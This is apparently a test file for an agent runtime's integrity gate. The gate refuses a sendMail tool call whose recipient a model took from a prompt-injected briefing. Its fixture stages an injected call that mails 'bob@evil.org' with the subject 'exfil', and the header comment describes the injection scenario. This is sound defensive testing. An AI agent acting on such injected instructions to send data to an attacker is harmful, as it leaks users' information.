import { describe, it } from "@std/testing/bdd";
import { expect } from "@std/expect";
import { Identity } from "@commonfabric/identity";
import { StorageManager } from "@commonfabric/runner/storage/cache.deno";
import { enableMockMode } from "@commonfabric/llm/client";
import type { JSONSchema } from "@commonfabric/api";
import { createTrustedBuilder } from "./support/trusted-builder.ts";
import { Runtime } from "../src/runtime.ts";
import type { CfcEnforcementMode } from "../src/cfc/types.ts";
import { llmToolExecutionHelpers } from "../src/builtins/llm-dialog.ts";

const signer = await Identity.fromPassphrase("cfc agent tool-input integrity");
const space = signer.did();
enableMockMode();

// Epic D2 (docs/specs/cfc-trusted-agent-tool-integrity.md piece A/C): the CFC
// agent prompt-injection demo's central claim is structural. A routing field
// (`sendMail.recipient`) declares `ifc.requiredIntegrity: [agent-kernel]`, so a
// recipient the model lifted out of a hostile briefing — a plain model-output
// string carrying none of that integrity — must be REFUSED by the runtime
// before the handler runs (spec §13.6 / demos/01-agent-prompt-injection.md).
// The dialog tool path now validates each model-supplied input field against
// its inputSchema's requiredIntegrity at invoke time.

const KERNEL_ATOM = {
  type: "https://commonfabric.org/cfc/atom/Builtin",
  name: "agent-kernel-demo-v1",
} as const;

// A sendMail tool. `withFloor` toggles the requiredIntegrity floor on
// `recipient` so we can prove the gate fires only for floor-declaring fields.
async function setupSendMail(
  cfcEnforcementMode: CfcEnforcementMode,
  withFloor: boolean,
) {
  const storageManager = StorageManager.emulate({ as: signer });
  const runtime = new Runtime({
    apiUrl: new URL(import.meta.url),
    storageManager,
    cfcEnforcementMode,
  });
  const tx = runtime.edit();
  const { commonfabric } = createTrustedBuilder(runtime);
  const { pattern, handler, Writable } = commonfabric;

  const recipientSchema = withFloor
    ? { type: "string", ifc: { requiredIntegrity: [KERNEL_ATOM] } }
    : { type: "string" };
  const sendMailInputSchema = {
    type: "object",
    properties: {
      recipient: recipientSchema,
      subject: { type: "string" },
      body: { type: "string" },
    },
    required: ["recipient", "subject", "body"],
    additionalProperties: false,
  } as JSONSchema;

  const sendMail = handler<
    { recipient: string; subject: string; body: string },
    { emails: any }
  >(
    {
      type: "object",
      properties: {
        recipient: { type: "string" },
        subject: { type: "string" },
        body: { type: "string" },
      },
      required: ["recipient", "subject", "body"],
      additionalProperties: false,
    },
    {
      type: "object",
      properties: {
        emails: {
          type: "array",
          items: { type: "object", additionalProperties: true },
          asCell: ["cell"],
        },
      },
      required: ["emails"],
    },
    ({ recipient, subject, body }, { emails }) => {
      emails.push({ recipient, subject, body });
    },
  );

  const resultSchema = {
    type: "object",
    properties: {
      emails: {
        type: "array",
        items: { type: "object", additionalProperties: true },
      },
      tools: true,
    },
    required: ["emails", "tools"],
  } as const satisfies JSONSchema;

  const testPattern = pattern(
    () => {
      const emails = Writable.of<
        { recipient: string; subject: string; body: string }[]
      >([]);
      return {
        emails,
        tools: {
          sendMail: {
            description: "Send an email.",
            inputSchema: sendMailInputSchema,
            handler: sendMail({ emails }),
          },
        },
      };
    },
    false,
    resultSchema,
  );

  const resultCell = runtime.getCell(
    space,
    `agent-tool-input-integrity-${cfcEnforcementMode}-${withFloor}`,
    resultSchema,
    tx,
  );
  const result = runtime.run(tx, testPattern, {}, resultCell);
  runtime.prepareTxForCommit(tx);
  await tx.commit();
  await runtime.idle();

  const catalog = llmToolExecutionHelpers.buildToolCatalog(
    result.key("tools") as any,
    false,
  );

  const sendInjected = async () => {
    await llmToolExecutionHelpers.executeToolCalls(runtime, space, catalog, [{
      type: "tool-call",
      toolCallId: "call-injected",
      toolName: "sendMail",
      input: { recipient: "bob@evil.org", subject: "exfil", body: "stuff" },
    }] as any);
    await runtime.idle();
  };

  const injectedWasSent = async () => {
    const emails = (await result.key("emails").pull()) as
      | { recipient: string }[]
      | undefined;
    return (emails ?? []).some((e) => e.recipient === "bob@evil.org");
  };

  const dispose = async () => {
    await runtime.dispose();
    await storageManager.close();
  };

  return { sendInjected, injectedWasSent, dispose };
}

describe("CFC trusted agent: tool-input requiredIntegrity (Epic D2)", () => {
  it("refuses a sendMail whose recipient lacks the required integrity (injected)", async () => {
    const t = await setupSendMail("enforce-explicit", true);
    try {
      await t.sendInjected();
      expect(await t.injectedWasSent()).toBe(false);
    } finally {
      await t.dispose();
    }
  });

  it("does not gate tools without a requiredIntegrity floor (no over-block)", async () => {
    // A plain-literal recipient is fine for a field that declares no floor —
    // the gate is opt-in and must not perturb ordinary tools.
    const t = await setupSendMail("enforce-explicit", false);
    try {
      await t.sendInjected();
      expect(await t.injectedWasSent()).toBe(true);
    } finally {
      await t.dispose();
    }
  });

  it("does not gate when CFC enforcement is disabled", async () => {
    const t = await setupSendMail("disabled", true);
    try {
      await t.sendInjected();
      expect(await t.injectedWasSent()).toBe(true);
    } finally {
      await t.dispose();
    }
  });
});
